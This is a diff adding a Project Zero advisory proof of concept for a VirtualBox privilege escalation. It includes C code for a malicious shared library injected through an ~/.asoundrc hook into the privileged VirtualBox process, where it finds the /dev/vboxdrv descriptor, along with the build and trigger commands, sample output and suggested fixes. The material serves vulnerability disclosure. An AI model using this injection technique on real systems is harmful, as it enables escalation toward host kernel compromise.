@@ -1,0 +1,82 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1141
+
+This is another way to escalate from an unprivileged userspace process
+into the VirtualBox process, which has an open file descriptor to the
+privileged device /dev/vboxdrv and can use that to compromise the
+host kernel.
+
+The issue is that, for VMs with ALSA audio, the privileged VM host
+process loads libasound, which parses ALSA configuration files,
+including one at ~/.asoundrc. ALSA is not designed to run in a setuid
+context and therefore deliberately permits loading arbitrary shared
+libraries via dlopen().
+
+To reproduce, on a normal Ubuntu desktop installation with VirtualBox
+installed, first configure a VM with ALSA audio, then (where
+ee347b44-b82d-41c2-b643-366cf297a37c is the ID of that VM):
+
+
+~$ cd /tmp
+/tmp$ cat > evil_vbox_lib.c
+*/
+
+#define _GNU_SOURCE
+
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/prctl.h>
+
+extern char *program_invocation_short_name;
+
+__attribute__((constructor)) void run(void) {
+	if (strcmp(program_invocation_short_name, "VirtualBox"))
+		return;
+
+	prctl(PR_SET_DUMPABLE, 1);
+	printf("running in pid %d\n", getpid());
+	printf("searching for vboxdrv file descriptor in current process...\n");
+	char linkbuf[1000];
+	char *needle = "/dev/vboxdrv";
+	for (int i=0; i<1000; i++) {
+		char linkpath[1000];
+		sprintf(linkpath, "/proc/self/fd/%d", i);
+		ssize_t linklen = readlink(linkpath, linkbuf, sizeof(linkbuf)-1);
+		if (linklen == -1) continue;
+		if (linklen == strlen(needle) && memcmp(linkbuf, needle, strlen(needle)) == 0) {
+			printf("found it, fd %d is /dev/vboxdrv\n", i);
+		}
+	}
+	_exit(0);
+}
+
+/*
+/tmp$ gcc -shared -o evil_vbox_lib.so evil_vbox_lib.c -fPIC -Wall -ldl -std=gnu99
+/tmp$ cat > ~/.asoundrc
+hook_func.pulse_load_if_running {
+        lib "/tmp/evil_vbox_lib.so"
+        func "conf_pulse_hook_load_if_running"
+}
+/tmp$ /usr/lib/virtualbox/VirtualBox --startvm ee347b44-b82d-41c2-b643-366cf297a37c
+running in pid 8910
+searching for vboxdrv file descriptor in current process...
+found it, fd 7 is /dev/vboxdrv
+/tmp$ rm ~/.asoundrc
+
+
+I believe that the ideal way to fix this would involve running
+libasound, together with other code that doesn't require elevated
+privileges - which would ideally be all userland code -, in an
+unprivileged process. However, for now, moving only the audio output
+handling into an unprivileged process might also do the job; I haven't
+yet checked whether there are more libraries VirtualBox loads that
+permit loading arbitrary libraries into the VirtualBox process.
+
+You could probably theoretically also fix this by modifying libasound
+to suppress dangerous configuration directives in ~/.asoundrc, but I
+believe that that would be brittle and hard to maintain.
+
+Tested on Ubuntu 14.04.5 with VirtualBox 5.1.14 r112924.
+*/
